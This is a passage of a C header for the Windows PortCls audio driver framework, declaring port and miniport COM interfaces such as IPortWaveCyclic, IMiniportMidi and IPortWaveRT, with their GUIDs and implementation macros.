        OUT PULONG ResultLength); \
\
    STDMETHODIMP_(NTSTATUS) QueryValueKey( \
        IN  PUNICODE_STRING ValueName, \
        IN  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, \
        OUT PVOID KeyValueInformation, \
        IN  ULONG Length, \
        OUT PULONG ResultLength); \
\
    STDMETHODIMP_(NTSTATUS) EnumerateValueKey( \
        IN  ULONG Index, \
        IN  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, \
        OUT PVOID KeyValueInformation, \
        IN  ULONG Length, \
        OUT PULONG ResultLength); \
\
    STDMETHODIMP_(NTSTATUS) SetValueKey( \
        IN  PUNICODE_STRING ValueName OPTIONAL, \
        IN  ULONG Type, \
        IN  PVOID Data, \
        IN  ULONG DataSize); \
\
    STDMETHODIMP_(NTSTATUS) QueryRegistryValues( \
        IN  PRTL_QUERY_REGISTRY_TABLE QueryTable, \
        IN  PVOID Context OPTIONAL); \
\
    STDMETHODIMP_(NTSTATUS) NewSubKey( \
        OUT IRegistryKey** RegistrySubKey, \
        IN  PUNKNOWN OuterUnknown, \
        IN  ACCESS_MASK DesiredAccess, \
        IN  PUNICODE_STRING SubKeyName, \
        IN  ULONG CreateOptions, \
        OUT PULONG Disposition OPTIONAL); \
\
    STDMETHODIMP_(NTSTATUS) DeleteKey(void);

typedef IRegistryKey *PREGISTRYKEY;


/* ===============================================================
    IMusicTechnology Interface
*/

DECLARE_INTERFACE_(IMusicTechnology, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(NTSTATUS, SetTechnology)( THIS_
        IN  const GUID* Technology) PURE;
};

#define IMP_IMusicTechnology \
    STDMETHODIMP_(NTSTATUS) SetTechnology( \
        IN  const GUID* Technology);

typedef IMusicTechnology *PMUSICTECHNOLOGY;


/* ===============================================================
    IPort Interface
*/

#if 0
#define STATIC_IPort 0xb4c90a25L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44
DEFINE_GUIDSTRUCT("0xB4C90A25-5791-11d0-86f9-00a0c911b544", IID_IPort);
#define IID_IPort DEFINE_GUIDNAMED(IID_IPort)
#endif

DEFINE_GUID(IID_IMiniport,
    0xb4c90a24L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

DEFINE_GUID(IID_IPort,
    0xb4c90a25L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

#define DEFINE_ABSTRACT_PORT() \
    STDMETHOD_(NTSTATUS, Init)( THIS_ \
        IN  PDEVICE_OBJECT DeviceObject, \
        IN  PIRP Irp, \
        IN  PUNKNOWN UnknownMiniport, \
        IN  PUNKNOWN UnknownAdapter OPTIONAL, \
        IN  PRESOURCELIST ResourceList) PURE; \
\
    STDMETHOD_(NTSTATUS, GetDeviceProperty)( THIS_ \
        IN  DEVICE_REGISTRY_PROPERTY DeviceProperty, \
        IN  ULONG BufferLength, \
        OUT PVOID PropertyBuffer, \
        OUT PULONG ResultLength) PURE; \
\
    STDMETHOD_(NTSTATUS, NewRegistryKey)( THIS_ \
        OUT PREGISTRYKEY* OutRegistryKey, \
        IN  PUNKNOWN OuterUnknown OPTIONAL, \
        IN  ULONG RegistryKeyType, \
        IN  ACCESS_MASK DesiredAccess, \
        IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, \
        IN  ULONG CreateOptiona OPTIONAL, \
        OUT PULONG Disposition OPTIONAL) PURE;

#ifdef PC_IMPLEMENTATION
#define IMP_IPort\
    STDMETHODIMP_(NTSTATUS) Init\
    (   IN      PDEVICE_OBJECT  DeviceObject,\
        IN      PIRP            Irp,\
        IN      PUNKNOWN        UnknownMiniport,\
        IN      PUNKNOWN        UnknownAdapter      OPTIONAL,\
        IN      PRESOURCELIST   ResourceList\
    );\
    STDMETHODIMP_(NTSTATUS) GetDeviceProperty\
    (   IN      DEVICE_REGISTRY_PROPERTY    DeviceProperty,\
        IN      ULONG                       BufferLength,\
        OUT     PVOID                       PropertyBuffer,\
        OUT     PULONG                      ResultLength\
    );\
    STDMETHODIMP_(NTSTATUS) NewRegistryKey\
    (   OUT     PREGISTRYKEY *      OutRegistryKey,\
        IN      PUNKNOWN            OuterUnknown        OPTIONAL,\
        IN      ULONG               RegistryKeyType,\
        IN      ACCESS_MASK         DesiredAccess,\
        IN      POBJECT_ATTRIBUTES  ObjectAttributes    OPTIONAL,\
        IN      ULONG               CreateOptions       OPTIONAL,\
        OUT     PULONG              Disposition         OPTIONAL\
    )
#endif

#undef INTERFACE
#define INTERFACE IPort

DECLARE_INTERFACE_(IPort, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_PORT()
};

typedef IPort *PPORT;


/* ===============================================================
    IPortMidi Interface
*/

DEFINE_GUID(IID_IPortMidi,
    0xb4c90a40L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);
DEFINE_GUID(CLSID_PortMidi,
    0xb4c90a43L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

#undef INTERFACE
#define INTERFACE IPortMidi

DECLARE_INTERFACE_(IPortMidi, IPort)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_PORT()

    STDMETHOD_(VOID, Notify)(THIS_
        IN  PSERVICEGROUP ServiceGroup OPTIONAL) PURE;

    STDMETHOD_(NTSTATUS, RegisterServiceGroup)(THIS_
        IN  PSERVICEGROUP ServiceGroup) PURE;
};

typedef IPortMidi *PPORTMIDI;

#define IMP_IPortMidi() \
    STDMETHODIMP_(VOID) Notify( \
        IN  PSERVICEGROUP ServiceGroup OPTIONAL); \
\
    STDMETHODIMP_(NTSTATUS) RegisterServiceGroup( \
        IN  PSERVICEGROUP ServiceGroup);

#undef INTERFACE

/* ===============================================================
    IPortWaveCyclic Interface
*/

DEFINE_GUID(IID_IPortWaveCyclic,
    0xb4c90a26L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);
DEFINE_GUID(CLSID_PortWaveCyclic,
    0xb4c90a2aL, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

#define INTERFACE IPortWaveCyclic

DECLARE_INTERFACE_(IPortWaveCyclic, IPort)
{
    DEFINE_ABSTRACT_UNKNOWN()

    DEFINE_ABSTRACT_PORT()

    STDMETHOD_(VOID, Notify)(THIS_
        IN  PSERVICEGROUP ServiceGroup) PURE;

    STDMETHOD_(NTSTATUS, NewSlaveDmaChannel)(THIS_
        OUT PDMACHANNELSLAVE* DmaChannel,
        IN  PUNKNOWN OuterUnknown,
        IN  PRESOURCELIST ResourceList OPTIONAL,
        IN  ULONG DmaIndex,
        IN  ULONG MaximumLength,
        IN  BOOLEAN DemandMode,
        IN  DMA_SPEED DmaSpeed) PURE;

    STDMETHOD_(NTSTATUS, NewMasterDmaChannel)(THIS_
        OUT PDMACHANNEL* DmaChannel,
        IN  PUNKNOWN OuterUnknown,
        IN  PRESOURCELIST ResourceList OPTIONAL,
        IN  ULONG MaximumLength,
        IN  BOOLEAN Dma32BitAddresses,
        IN  BOOLEAN Dma64BitAddresses,
        IN  DMA_WIDTH DmaWidth,
        IN  DMA_SPEED DmaSpeed) PURE;

};

typedef IPortWaveCyclic *PPORTWAVECYCLIC;

#ifdef PC_IMPLEMENTATION
#define IMP_IPortWaveCyclic                           \
    IMP_IPort;                                        \
    STDMETHODIMP_(VOID) Notify(                       \
        IN  PSERVICEGROUP ServiceGroup);              \
                                                      \
    STDMETHODIMP_(NTSTATUS) NewSlaveDmaChannel(       \
        OUT PDMACHANNELSLAVE* DmaChannel,             \
        IN  PUNKNOWN OuterUnknown,                    \
        IN  PRESOURCELIST ResourceList OPTIONAL,      \
        IN  ULONG DmaIndex,                           \
        IN  ULONG MaximumLength,                      \
        IN  BOOLEAN DemandMode,                       \
        IN  DMA_SPEED DmaSpeed);                      \
                                                      \
    STDMETHODIMP_(NTSTATUS) NewMasterDmaChannel(      \
        OUT PDMACHANNEL* DmaChannel,                  \
        IN  PUNKNOWN OuterUnknown,                    \
        IN  PRESOURCELIST ResourceList OPTIONAL,      \
        IN  ULONG MaximumLength,                      \
        IN  BOOLEAN Dma32BitAddresses,                \
        IN  BOOLEAN Dma64BitAddresses,                \
        IN  DMA_WIDTH DmaWidth,                       \
        IN  DMA_SPEED DmaSpeed)
#endif


#undef INTERFACE
/* ===============================================================
    IPortWavePci Interface
*/
#undef INTERFACE
#define INTERFACE IPortWavePci

DEFINE_GUID(IID_IPortWavePci,
    0xb4c90a50L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);
DEFINE_GUID(CLSID_PortWavePci,
    0xb4c90a54L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

DECLARE_INTERFACE_(IPortWavePci, IPort)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_PORT()

    STDMETHOD_(VOID, Notify)(THIS_
        IN  PSERVICEGROUP ServiceGroup) PURE;

    STDMETHOD_(NTSTATUS, NewMasterDmaChannel)(THIS_
        OUT PDMACHANNEL* DmaChannel,
        IN  PUNKNOWN OuterUnknown,
        IN  POOL_TYPE PoolType,
        IN  PRESOURCELIST ResourceList OPTIONAL,
        IN  BOOLEAN ScatterGather,
        IN  BOOLEAN Dma32BitAddresses,
        IN  BOOLEAN Dma64BitAddresses,
        IN  BOOLEAN IgnoreCount,
        IN  DMA_WIDTH DmaWidth,
        IN  DMA_SPEED DmaSpeed,
        IN  ULONG MaximumLength,
        IN  ULONG DmaPort) PURE;
};

typedef IPortWavePci *PPORTWAVEPCI;
#undef INTERFACE

#ifdef PC_IMPLEMENTATION
#define IMP_IPortWavePci                                     \
    IMP_IPort;                                               \
    STDMETHODIMP_(VOID) Notify(                              \
        IN  PSERVICEGROUP ServiceGroup);                     \
                                                             \
    STDMETHODIMP_(NTSTATUS) NewMasterDmaChannel(             \
        OUT PDMACHANNEL* DmaChannel,                         \
        IN  PUNKNOWN OuterUnknown,                           \
        IN  POOL_TYPE PoolType,                              \
        IN  PRESOURCELIST ResourceList OPTIONAL,             \
        IN  BOOLEAN ScatterGather,                           \
        IN  BOOLEAN Dma32BitAddresses,                       \
        IN  BOOLEAN Dma64BitAddresses,                       \
        IN  BOOLEAN IgnoreCount,                             \
        IN  DMA_WIDTH DmaWidth,                              \
        IN  DMA_SPEED DmaSpeed,                              \
        IN  ULONG MaximumLength,                             \
        IN  ULONG DmaPort);
#endif

/* ===============================================================
    IMiniPort Interface
*/

DEFINE_GUID(IID_IMiniPort,
    0xb4c90a24L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

#define DEFINE_ABSTRACT_MINIPORT() \
    STDMETHOD_(NTSTATUS, GetDescription)( THIS_ \
        OUT  PPCFILTER_DESCRIPTOR* Description) PURE; \
\
    STDMETHOD_(NTSTATUS, DataRangeIntersection)( THIS_ \
        IN  ULONG PinId, \
        IN  PKSDATARANGE DataRange, \
        IN  PKSDATARANGE MatchingDataRange, \
        IN  ULONG OutputBufferLength, \
        OUT PVOID ResultantFormat OPTIONAL, \
        OUT PULONG ResultantFormatLength) PURE;

#define IMP_IMiniport                                        \
    STDMETHODIMP_(NTSTATUS) GetDescription(                  \
        OUT  PPCFILTER_DESCRIPTOR* Description);             \
                                                             \
    STDMETHODIMP_(NTSTATUS) DataRangeIntersection(           \
        IN  ULONG PinId,                                     \
        IN  PKSDATARANGE DataRange,                          \
        IN  PKSDATARANGE MatchingDataRange,                  \
        IN  ULONG OutputBufferLength,                        \
        OUT PVOID ResultantFormat OPTIONAL,                  \
        OUT PULONG ResultantFormatLength)

DECLARE_INTERFACE_(IMiniport, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_MINIPORT()
};

typedef IMiniport *PMINIPORT;


/* ===============================================================
    IMiniportMidiStream Interface
*/
#undef INTERFACE
#define INTERFACE IMiniportMidiStream

DEFINE_GUID(IID_IMiniportMidiStream,
    0xb4c90a42L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

DECLARE_INTERFACE_(IMiniportMidiStream, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(NTSTATUS,SetFormat)(THIS_
        IN PKSDATAFORMAT DataFormat)PURE;

    STDMETHOD_(NTSTATUS,SetState)(THIS_
        IN KSSTATE State)PURE;

    STDMETHOD_(NTSTATUS,Read)(THIS_
        IN PVOID BufferAddress,
        IN ULONG BufferLength,
        OUT PULONG BytesRead)PURE;

    STDMETHOD_(NTSTATUS,Write)(THIS_
        IN PVOID BufferAddress,
        IN ULONG BytesToWrite,
        OUT PULONG BytesWritten)PURE;
};

typedef IMiniportMidiStream* PMINIPORTMIDISTREAM;
#undef INTERFACE

/* ===============================================================
    IMiniportMidi Interface
*/
#undef INTERFACE
#define INTERFACE IMiniportMidi

DEFINE_GUID(IID_IMiniportMidi,
    0xb4c90a41L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

DECLARE_INTERFACE_(IMiniportMidi, IMiniport)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_MINIPORT()

    STDMETHOD_(NTSTATUS, Init)(THIS_
    IN  PUNKNOWN UnknownAdapter,
    IN  PRESOURCELIST ResourceList,
    IN  PPORTMIDI Port,
    OUT PSERVICEGROUP* ServiceGroup) PURE;

    STDMETHOD_(void, Service)(THIS) PURE;

    STDMETHOD_(NTSTATUS, NewStream)(THIS_
        OUT PMINIPORTMIDISTREAM *Stream,
        IN  PUNKNOWN OuterUnknown OPTIONAL,
        IN  POOL_TYPE PoolType,
        IN  ULONG Pin,
        IN  BOOLEAN Capture,
        IN  PKSDATAFORMAT DataFormat,
        OUT PSERVICEGROUP* ServiceGroup) PURE;

};

typedef IMiniportMidi *PMINIPORTMIDI;
#undef INTERFACE

/* ===============================================================
    IMiniportDriverUart Interface
*/

DEFINE_GUID(IID_MiniportDriverUart,
    0xb4c90ae1L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);
DEFINE_GUID(CLSID_MiniportDriverUart,
    0xb4c90ae1L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

/* ===============================================================
    IPortTopology Interface
*/
#if 0
#define STATIC_IPortTopology \
    0xb4c90a30L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44
DEFINE_GUIDSTRUCT("0xB4C90A30-5791-11d0-86f9-00a0c911b544", IID_IPortTopology);
#define IID_IPortTopology DEFINE_GUIDNAMED(IID_IPortTopology)
#endif

#undef INTERFACE
#define INTERFACE IPortTopology

DEFINE_GUID(IID_IPortTopology, 0xb4c90a30L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);
DEFINE_GUID(CLSID_PortTopology, 0xb4c90a32L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

#undef INTERFACE
#define INTERFACE IPortTopology

DECLARE_INTERFACE_(IPortTopology, IPort)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_PORT()
};

typedef IPortTopology *PPORTTOPOLOGY;

#define IMP_IPortTopology IMP_IPort


/* ===============================================================
    IMiniportTopology Interface
*/

#undef INTERFACE
#define INTERFACE IMiniportTopology

DEFINE_GUID(IID_IMiniportTopology, 0xb4c90a31L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

#undef INTERFACE
#define INTERFACE IMiniportTopology

DECLARE_INTERFACE_(IMiniportTopology,IMiniport)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_MINIPORT()

    STDMETHOD_(NTSTATUS,Init)(THIS_
        IN PUNKNOWN UnknownAdapter,
        IN PRESOURCELIST ResourceList,
        IN PPORTTOPOLOGY Port)PURE;
};

typedef IMiniportTopology *PMINIPORTTOPOLOGY;

/* ===============================================================
    IMiniportWaveCyclicStream Interface
*/

#undef INTERFACE
#define INTERFACE IMiniportWaveCyclicStream

DEFINE_GUID(IID_IMiniportWaveCyclicStream,
0xb4c90a28L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

DECLARE_INTERFACE_(IMiniportWaveCyclicStream,IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(NTSTATUS,SetFormat)(THIS_
        IN PKSDATAFORMAT DataFormat)PURE;

    STDMETHOD_(ULONG,SetNotificationFreq)(THIS_
        IN ULONG Interval,
        OUT PULONG FrameSize) PURE;

    STDMETHOD_(NTSTATUS,SetState)(THIS_
        IN KSSTATE State) PURE;

    STDMETHOD_(NTSTATUS,GetPosition)( THIS_
        OUT PULONG Position) PURE;

    STDMETHOD_(NTSTATUS,NormalizePhysicalPosition)(THIS_
        IN OUT PLONGLONG PhysicalPosition) PURE;

    STDMETHOD_(void, Silence)( THIS_
        IN PVOID Buffer,
        IN ULONG ByteCount) PURE;
};

typedef IMiniportWaveCyclicStream *PMINIPORTWAVECYCLICSTREAM;

#define IMP_IMiniportWaveCyclicStream\
    STDMETHODIMP_(NTSTATUS) SetFormat\
    (   IN      PKSDATAFORMAT   DataFormat\
    );\
    STDMETHODIMP_(ULONG) SetNotificationFreq\
    (   IN      ULONG           Interval,\
        OUT     PULONG          FrameSize\
    );\
    STDMETHODIMP_(NTSTATUS) SetState\
    (   IN      KSSTATE         State\
    );\
    STDMETHODIMP_(NTSTATUS) GetPosition\
    (   OUT     PULONG          Position\
    );\
    STDMETHODIMP_(NTSTATUS) NormalizePhysicalPosition\
    (   IN OUT PLONGLONG        PhysicalPosition\
    );\
    STDMETHODIMP_(void) Silence\
    (   IN      PVOID           Buffer,\
        IN      ULONG           ByteCount\
    )


/* ===============================================================
    IMiniportWaveCyclic Interface
*/
#undef INTERFACE

DEFINE_GUID(IID_IMiniportWaveCyclic,
    0xb4c90a27L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

#define INTERFACE IMiniportWaveCyclic

DECLARE_INTERFACE_(IMiniportWaveCyclic, IMiniport)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_MINIPORT()

    STDMETHOD_(NTSTATUS, Init)(THIS_
        IN PUNKNOWN  UnknownAdapter,
        IN PRESOURCELIST  ResourceList,
        IN PPORTWAVECYCLIC  Port) PURE;

    STDMETHOD_(NTSTATUS, NewStream)(THIS_
        OUT PMINIPORTWAVECYCLICSTREAM  *Stream,
        IN PUNKNOWN  OuterUnknown  OPTIONAL,
        IN POOL_TYPE  PoolType,
        IN ULONG  Pin,
        IN BOOLEAN  Capture,
        IN PKSDATAFORMAT  DataFormat,
        OUT PDMACHANNEL  *DmaChannel,
        OUT PSERVICEGROUP  *ServiceGroup) PURE;
};

typedef IMiniportWaveCyclic *PMINIPORTWAVECYCLIC;
#undef INTERFACE

#define IMP_IMiniportWaveCyclic\
    IMP_IMiniport;\
    STDMETHODIMP_(NTSTATUS) Init\
    (   IN      PUNKNOWN        UnknownAdapter,\
        IN      PRESOURCELIST   ResourceList,\
        IN      PPORTWAVECYCLIC Port\
    );\
    STDMETHODIMP_(NTSTATUS) NewStream\
    (   OUT     PMINIPORTWAVECYCLICSTREAM * Stream,\
        IN      PUNKNOWN                    OuterUnknown    OPTIONAL,\
        IN      POOL_TYPE                   PoolType,\
        IN      ULONG                       Pin,\
        IN      BOOLEAN                     Capture,\
        IN      PKSDATAFORMAT               DataFormat,\
        OUT     PDMACHANNEL *               DmaChannel,\
        OUT     PSERVICEGROUP *             ServiceGroup\
    )


/* ===============================================================
    IPortWavePciStream Interface
*/
#undef INTERFACE
#define INTERFACE IPortWavePciStream

DEFINE_GUID(IID_IPortWavePciStream, 0xb4c90a51L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

DECLARE_INTERFACE_(IPortWavePciStream,IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()   //  For IUnknown

    STDMETHOD_(NTSTATUS,GetMapping)(THIS_
        IN PVOID Tag,
        OUT PPHYSICAL_ADDRESS PhysicalAddress,
        OUT PVOID * VirtualAddress,
        OUT PULONG ByteCount,
        OUT PULONG Flags)PURE;

    STDMETHOD_(NTSTATUS,ReleaseMapping)(THIS_
        IN PVOID Tag)PURE;

    STDMETHOD_(NTSTATUS,TerminatePacket)(THIS)PURE;
};

typedef IPortWavePciStream *PPORTWAVEPCISTREAM;

#define IMP_IPortWavePciStream                             \
    STDMETHODIMP_(NTSTATUS) GetMapping(                    \
        IN PVOID Tag,                                      \
        OUT PPHYSICAL_ADDRESS PhysicalAddress,             \
        OUT PVOID * VirtualAddress,                        \
        OUT PULONG ByteCount,                              \
        OUT PULONG Flags);                                 \
                                                           \
    STDMETHODIMP_(NTSTATUS) ReleaseMapping(                \
        IN PVOID Tag);                                     \
                                                           \
    STDMETHODIMP_(NTSTATUS) TerminatePacket(THIS)


/* ===============================================================
    IMiniportWavePciStream Interface
*/
#undef INTERFACE
#define INTERFACE IMiniportWavePciStream

DEFINE_GUID(IID_IMiniportWavePciStream, 0xb4c90a53L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

DECLARE_INTERFACE_(IMiniportWavePciStream,IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(NTSTATUS,SetFormat)(THIS_
        IN PKSDATAFORMAT DataFormat)PURE;

    STDMETHOD_(NTSTATUS,SetState)(THIS_
        IN KSSTATE State)PURE;

    STDMETHOD_(NTSTATUS,GetPosition)(THIS_
        OUT PULONGLONG Position)PURE;

    STDMETHOD_(NTSTATUS,NormalizePhysicalPosition)(THIS_
        IN OUT PLONGLONG PhysicalPosition)PURE;

    STDMETHOD_(NTSTATUS,GetAllocatorFraming)(THIS_
        OUT PKSALLOCATOR_FRAMING AllocatorFraming) PURE;

    STDMETHOD_(NTSTATUS,RevokeMappings)(THIS_
        IN PVOID FirstTag,
        IN PVOID LastTag,
        OUT PULONG MappingsRevoked)PURE;

    STDMETHOD_(void,MappingAvailable)(THIS)PURE;

    STDMETHOD_(void,Service)(THIS)PURE;
};

typedef IMiniportWavePciStream *PMINIPORTWAVEPCISTREAM;

/* ===============================================================
    IMiniportWavePci Interface
*/
#undef INTERFACE
#define INTERFACE IMiniportWavePci

DEFINE_GUID(IID_IMiniportWavePci, 0xb4c90a52L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);

DECLARE_INTERFACE_(IMiniportWavePci,IMiniport)
{
    DEFINE_ABSTRACT_UNKNOWN()

    DEFINE_ABSTRACT_MINIPORT()

    STDMETHOD_(NTSTATUS,Init)(THIS_
        IN PUNKNOWN UnknownAdapter,
        IN PRESOURCELIST ResourceList,
        IN PPORTWAVEPCI Port,
        OUT PSERVICEGROUP * ServiceGroup)PURE;

    STDMETHOD_(NTSTATUS,NewStream)(THIS_
        OUT PMINIPORTWAVEPCISTREAM *    Stream,
        IN PUNKNOWN OuterUnknown    OPTIONAL,
        IN POOL_TYPE PoolType,
        IN PPORTWAVEPCISTREAM PortStream,
        IN ULONG Pin,
        IN BOOLEAN Capture,
        IN PKSDATAFORMAT DataFormat,
        OUT PDMACHANNEL * DmaChannel,
        OUT PSERVICEGROUP * ServiceGroup)PURE;

    STDMETHOD_(void,Service)(THIS)PURE;
};

typedef IMiniportWavePci *PMINIPORTWAVEPCI;


#if !defined(DEFINE_ABSTRACT_MINIPORTWAVERTSTREAM)

#define DEFINE_ABSTRACT_MINIPORTWAVERTSTREAM()                 \
    STDMETHOD_(NTSTATUS,SetFormat)                             \
    (   THIS_                                                  \
        IN      PKSDATAFORMAT   DataFormat                   \
    )   PURE;                                                  \
    STDMETHOD_(NTSTATUS,SetState)                              \
    (   THIS_                                                  \
        IN      KSSTATE         State                        \
    )   PURE;                                                  \
    STDMETHOD_(NTSTATUS,GetPosition)                           \
    (   THIS_                                                  \
        OUT     PKSAUDIO_POSITION   Position                 \
    )   PURE;                                                  \
    STDMETHOD_(NTSTATUS,AllocateAudioBuffer)                   \
    (   THIS_                                                  \
        IN  ULONG                   RequestedSize,           \
        OUT PMDL                    *AudioBufferMdl,         \
        OUT ULONG                   *ActualSize,             \
        OUT ULONG                   *OffsetFromFirstPage,    \
        OUT MEMORY_CACHING_TYPE     *CacheType               \
    ) PURE;                                                    \
    STDMETHOD_(VOID,FreeAudioBuffer)                           \
    (   THIS_                                                  \
        IN     PMDL                    AudioBufferMdl,          \
        IN     ULONG                   BufferSize               \
    ) PURE;                                                    \
    STDMETHOD_(VOID,GetHWLatency)                              \
    (   THIS_                                                  \
        OUT KSRTAUDIO_HWLATENCY     *hwLatency               \
    ) PURE;                                                    \
    STDMETHOD_(NTSTATUS,GetPositionRegister)                   \
    (   THIS_                                                  \
        OUT KSRTAUDIO_HWREGISTER    *Register                \
    ) PURE;                                                    \
    STDMETHOD_(NTSTATUS,GetClockRegister)                      \
    (   THIS_                                                  \
        OUT KSRTAUDIO_HWREGISTER    *Register                \
    ) PURE;

#endif


/* ===============================================================
    IAdapterPowerManagement Interface
*/

#if (NTDDI_VERSION >= NTDDI_VISTA)
/* ===============================================================
    IPortWaveRT Interface
*/

DEFINE_GUID(CLSID_PortWaveRT, 0xcc9be57a, 0xeb9e, 0x42b4, 0x94, 0xfc, 0xc, 0xad, 0x3d, 0xbc, 0xe7, 0xfa);
DEFINE_GUID(IID_IPortWaveRT, 0x339ff909, 0x68a9, 0x4310, 0xb0, 0x9b, 0x27, 0x4e, 0x96, 0xee, 0x4c, 0xbd);

#undef INTERFACE
#define INTERFACE IPortWaveRT

DECLARE_INTERFACE_(IPortWaveRT,IPort)
{
    DEFINE_ABSTRACT_UNKNOWN()   //  For IUnknown

    DEFINE_ABSTRACT_PORT()      //  For IPort
};

typedef IPortWaveRT *PPORTWAVERT;

#ifdef PC_IMPLEMENTATION
#define IMP_IPortWaveRT IMP_IPort
#endif


/* ===============================================================
    IPortWaveRTStream Interface
*/

#undef INTERFACE
#define INTERFACE IPortWaveRTStream

DEFINE_GUID(IID_IPortWaveRTStream, 0x1809ce5a, 0x64bc, 0x4e62, 0xbd, 0x7d, 0x95, 0xbc, 0xe4, 0x3d, 0xe3, 0x93);

DECLARE_INTERFACE_(IPortWaveRTStream, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(PMDL, AllocatePagesForMdl)
    (   THIS_
        IN      PHYSICAL_ADDRESS    HighAddress,
        IN      SIZE_T              TotalBytes
    )   PURE;

    STDMETHOD_(PMDL, AllocateContiguousPagesForMdl)
    (   THIS_
        IN      PHYSICAL_ADDRESS    LowAddress,
        IN      PHYSICAL_ADDRESS    HighAddress,
        IN      SIZE_T              TotalBytes
    )   PURE;

    STDMETHOD_(PVOID, MapAllocatedPages)
    (   THIS_
        IN      PMDL                    MemoryDescriptorList,
        IN      MEMORY_CACHING_TYPE     CacheType
    )   PURE;

    STDMETHOD_(VOID, UnmapAllocatedPages)
    (   THIS_
        IN      PVOID   BaseAddress,
        IN      PMDL    MemoryDescriptorList
    )   PURE;

    STDMETHOD_(VOID, FreePagesFromMdl)
    (   THIS_
        IN      PMDL    MemoryDescriptorList
    )   PURE;

    STDMETHOD_(ULONG, GetPhysicalPagesCount)
    (   THIS_
        IN      PMDL    MemoryDescriptorList
    )   PURE;

    STDMETHOD_(PHYSICAL_ADDRESS, GetPhysicalPageAddress)
    (   THIS_
        IN      PMDL    MemoryDescriptorList,
        IN      ULONG   Index
    )   PURE;
};

typedef IPortWaveRTStream *PPORTWAVERTSTREAM;


/* ===============================================================
    IMiniportWaveRTStream Interface
*/

#undef INTERFACE
#define INTERFACE IMiniportWaveRTStream

DEFINE_GUID(IID_IMiniportWaveRTStream, 0xac9ab, 0xfaab, 0x4f3d, 0x94, 0x55, 0x6f, 0xf8, 0x30, 0x6a, 0x74, 0xa0);

DECLARE_INTERFACE_(IMiniportWaveRTStream, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_MINIPORTWAVERTSTREAM()
};

typedef IMiniportWaveRTStream *PMINIPORTWAVERTSTREAM;

#define IMP_IMiniportWaveRTStream\
    STDMETHODIMP_(NTSTATUS) SetFormat\
    (   IN      PKSDATAFORMAT   DataFormat\
    );\
    STDMETHODIMP_(NTSTATUS) SetState\
    (   IN      KSSTATE         State\
    );\
    STDMETHODIMP_(NTSTATUS) GetPosition\
    (   OUT     PKSAUDIO_POSITION   Position\
    );\
    STDMETHODIMP_(NTSTATUS) AllocateAudioBuffer\
    (\
        IN      ULONG                   RequestedSize,\
        OUT     PMDL                    *AudioBufferMdl,\
        OUT     ULONG                   *ActualSize,\
        OUT     ULONG                   *OffsetFromFirstPage,\
        OUT     MEMORY_CACHING_TYPE     *CacheType\
    );\
